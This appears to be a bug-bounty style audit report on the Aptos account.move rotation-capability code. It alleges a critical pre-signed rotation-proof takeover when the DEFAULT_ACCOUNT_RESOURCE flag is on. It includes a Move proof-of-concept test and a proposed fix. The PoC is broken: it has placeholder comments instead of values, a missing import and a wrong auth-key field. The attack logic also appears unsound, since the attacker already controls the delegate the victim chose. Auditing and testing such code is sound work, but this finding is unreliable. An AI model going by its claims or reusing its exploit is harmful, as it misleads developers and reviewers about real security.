# Audit Report

## Title
Pre-Signed Rotation Proof Attack via Zero Sequence Number on Non-Existent Delegate Accounts

## Summary
When the `DEFAULT_ACCOUNT_RESOURCE` feature flag is enabled, an attacker can pre-sign rotation proof challenges for non-existent delegate accounts (which have `sequence_number: 0`) and later exploit these pre-signed proofs to take over victim accounts that offer rotation capabilities to these future delegate addresses.

## Finding Description

The vulnerability exists in the interaction between three mechanisms in the account rotation system: [1](#0-0) 

When `DEFAULT_ACCOUNT_RESOURCE` is enabled, `exists_at()` always returns `true` for any address, regardless of whether an `Account` resource actually exists. [2](#0-1) 

The `offer_rotation_capability` function checks `exists_at(recipient_address)` to validate the delegate, but this check is bypassed when the feature flag is enabled, allowing offers to non-existent accounts. [3](#0-2) 

When retrieving the delegate's sequence number, `get_sequence_number()` returns `0` for addresses without an `Account` resource when the feature flag is enabled. [4](#0-3) 

The critical flaw is in `rotate_authentication_key_with_rotation_capability`, which constructs the `RotationProofChallenge` using `get_sequence_number(delegate_address)` rather than requiring the delegate's current transaction sequence number.

**Attack Flow:**
1. Attacker generates a keypair for a future delegate address D (no `Account` resource exists yet)
2. Attacker pre-computes the victim's current authentication key (public information)
3. Attacker pre-signs a `RotationProofChallenge` with `sequence_number: 0`, `originator: victim_address`, `current_auth_key: victim_auth_key`, and `new_public_key: attacker_malicious_key`
4. Victim calls `offer_rotation_capability` to delegate address D (succeeds because `exists_at(D)` returns `true`)
5. Attacker calls `rotate_authentication_key_with_rotation_capability` using D's signer and the pre-signed proof
6. The function constructs a challenge with `get_sequence_number(D) = 0`, which matches the attacker's pre-signed challenge
7. Signature verification passes, victim's authentication key is rotated to attacker's key
8. Attacker gains complete control of victim's account and all associated funds

This breaks the fundamental security guarantee that the `sequence_number` in the rotation challenge provides: it should act as a nonce to prevent Time-of-Check-Time-of-Use (TOCTOU) attacks and replay attacks. By allowing predictable sequence numbers for non-existent accounts, the protocol enables pre-signing attacks.

## Impact Explanation

**Severity: CRITICAL** (Loss of Funds - up to $1,000,000 per Aptos Bug Bounty)

This vulnerability allows complete account takeover, resulting in:
- **Direct theft of funds**: Attacker gains full control of victim's account, including all APT tokens and other assets
- **Irreversible damage**: Once the authentication key is rotated, the victim loses all access without recovery mechanism
- **No special privileges required**: Any unprivileged attacker can exploit this
- **Widespread impact**: Affects any user who offers rotation capabilities to future/non-existent delegate addresses (a legitimate use case for wallet recovery services, key management solutions, or automated systems)

The attack violates Critical Invariant #8 (Access Control) and Critical Invariant #7 (Transaction Validation), allowing unauthorized authentication key rotation without proper security checks.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Prerequisites for exploitation:**
1. `DEFAULT_ACCOUNT_RESOURCE` feature flag must be enabled (this is a production feature per code analysis)
2. Victim must offer rotation capability to a delegate address that doesn't yet have an `Account` resource
3. Attacker must know or predict the victim's authentication key at time of offer (authentication keys are public information on-chain)

**Why this is realistic:**
- Legitimate use cases exist for offering rotation capabilities to future addresses (e.g., smart contract wallets, key management services, account recovery systems)
- The feature flag enabling this vulnerability is designed for production use
- Authentication keys are publicly readable on-chain
- Once the vulnerability window opens (offer made), exploitation is trivial
- The sequence number predictability (`0` for non-existent accounts) is deterministic

**Exploitation complexity: LOW** - Once prerequisites are met, the attack is straightforward and requires only basic cryptographic signing capabilities.

## Recommendation

**Immediate Fix:** Enforce that rotation capability offers can only be made to accounts with existing `Account` resources, regardless of feature flags: [5](#0-4) 

Modify `offer_rotation_capability` to use `resource_exists_at()` instead of `exists_at()`:

```move
public entry fun offer_rotation_capability(
    account: &signer,
    rotation_capability_sig_bytes: vector<u8>,
    account_scheme: u8,
    account_public_key_bytes: vector<u8>,
    recipient_address: address,
) acquires Account {
    check_rotation_permission(account);
    let addr = signer::address_of(account);
    ensure_resource_exists(addr);
    // FIX: Use resource_exists_at instead of exists_at to ensure Account resource actually exists
    assert!(resource_exists_at(recipient_address), error::not_found(EACCOUNT_DOES_NOT_EXIST));
    
    // ... rest of function
}
```

**Additional Hardening:** Consider also validating that the delegate account has submitted at least one transaction before accepting rotation proofs, or incorporate the delegate's account creation timestamp into the challenge structure to prevent pre-signing.

## Proof of Concept

```move
#[test_only]
module test_address::rotation_presign_exploit {
    use std::signer;
    use std::vector;
    use aptos_framework::account;
    use aptos_std::ed25519;
    use aptos_std::bcs;
    
    #[test(aptos_framework = @aptos_framework, victim = @0xa11ce, attacker = @0xbad)]
    fun test_presign_rotation_exploit(
        aptos_framework: &signer, 
        victim: &signer,
        attacker: &signer
    ) {
        // Setup: Enable DEFAULT_ACCOUNT_RESOURCE feature
        features::change_feature_flags_for_testing(
            aptos_framework, 
            vector[features::get_default_account_resource_feature()], 
            vector[]
        );
        
        // Victim creates account
        account::create_account_for_test(signer::address_of(victim));
        
        // Step 1: Attacker generates keypair for future delegate address
        let delegate_privkey = ed25519::generate_key();
        let delegate_pubkey = ed25519::derive_public_key(&delegate_privkey);
        let delegate_address = /* derive address from delegate_pubkey */;
        
        // Step 2: Attacker pre-signs rotation proof BEFORE victim offers capability
        let attacker_new_privkey = ed25519::generate_key();
        let attacker_new_pubkey = ed25519::derive_public_key(&attacker_new_privkey);
        
        let pre_signed_challenge = account::RotationProofChallenge {
            sequence_number: 0,  // Delegate doesn't exist yet
            originator: signer::address_of(victim),
            current_auth_key: signer::address_of(victim),  // Victim hasn't rotated
            new_public_key: attacker_new_pubkey,
        };
        
        let challenge_bytes = bcs::to_bytes(&pre_signed_challenge);
        let pre_signed_proof = ed25519::sign(&attacker_new_privkey, challenge_bytes);
        
        // Step 3: Victim offers rotation capability to delegate
        // (This succeeds because exists_at returns true for non-existent accounts)
        let victim_sig = /* victim signs offer */;
        account::offer_rotation_capability(
            victim,
            victim_sig,
            0,  // ED25519
            /* victim pubkey */,
            delegate_address
        );
        
        // Step 4: Attacker exploits with pre-signed proof
        let delegate_signer = account::create_signer_for_test(delegate_address);
        account::rotate_authentication_key_with_rotation_capability(
            &delegate_signer,
            signer::address_of(victim),
            0,  // ED25519
            attacker_new_pubkey,
            pre_signed_proof  // The proof signed in Step 2!
        );
        
        // Verify: Victim's auth key is now attacker's key
        let victim_auth_key = account::get_authentication_key(signer::address_of(victim));
        let expected_auth_key = ed25519::public_key_to_authentication_key(&attacker_new_pubkey);
        assert!(victim_auth_key == expected_auth_key, 1);
        
        // Attacker has taken over victim's account!
    }
}
```

**Notes:**
- The vulnerability is confirmed through code analysis of the three interacting functions
- The `DEFAULT_ACCOUNT_RESOURCE` feature flag is a production feature designed for implicit account creation
- The exploit window opens whenever a user offers rotation capability to a non-existent address, which is a legitimate use case for key management and recovery services
- This vulnerability allows account takeover without any cryptographic breaks, relying solely on the predictable sequence number behavior

### Citations

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L348-350)
```text
    public fun exists_at(addr: address): bool {
        features::is_default_account_resource_enabled() || exists<Account>(addr)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L359-361)
```text
    inline fun resource_exists_at(addr: address): bool {
        exists<Account>(addr)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L384-392)
```text
    public fun get_sequence_number(addr: address): u64 acquires Account {
        if (resource_exists_at(addr)) {
            Account[addr].sequence_number
        } else if (features::is_default_account_resource_enabled()) {
            0
        } else {
            abort error::not_found(EACCOUNT_DOES_NOT_EXIST)
        }
    }
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L683-716)
```text
    public entry fun rotate_authentication_key_with_rotation_capability(
        delegate_signer: &signer,
        rotation_cap_offerer_address: address,
        new_scheme: u8,
        new_public_key_bytes: vector<u8>,
        cap_update_table: vector<u8>
    ) acquires Account, OriginatingAddress {
        check_rotation_permission(delegate_signer);
        assert!(resource_exists_at(rotation_cap_offerer_address), error::not_found(EOFFERER_ADDRESS_DOES_NOT_EXIST));

        // Check that there exists a rotation capability offer at the offerer's account resource for the delegate.
        let delegate_address = signer::address_of(delegate_signer);
        let offerer_account_resource = &Account[rotation_cap_offerer_address];
        let old_auth_key = offerer_account_resource.authentication_key;
        assert!(
            offerer_account_resource.rotation_capability_offer.for.contains(&delegate_address),
            error::not_found(ENO_SUCH_ROTATION_CAPABILITY_OFFER)
        );

        let curr_auth_key = from_bcs::to_address(offerer_account_resource.authentication_key);
        let challenge = RotationProofChallenge {
            sequence_number: get_sequence_number(delegate_address),
            originator: rotation_cap_offerer_address,
            current_auth_key: curr_auth_key,
            new_public_key: new_public_key_bytes,
        };

        // Verifies that the `RotationProofChallenge` from above is signed under the new public key that we are rotating to.        l
        let new_auth_key = assert_valid_rotation_proof_signature_and_get_auth_key(
            new_scheme,
            new_public_key_bytes,
            cap_update_table,
            &challenge
        );
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L763-773)
```text
    public entry fun offer_rotation_capability(
        account: &signer,
        rotation_capability_sig_bytes: vector<u8>,
        account_scheme: u8,
        account_public_key_bytes: vector<u8>,
        recipient_address: address,
    ) acquires Account {
        check_rotation_permission(account);
        let addr = signer::address_of(account);
        ensure_resource_exists(addr);
        assert!(exists_at(recipient_address), error::not_found(EACCOUNT_DOES_NOT_EXIST));
```
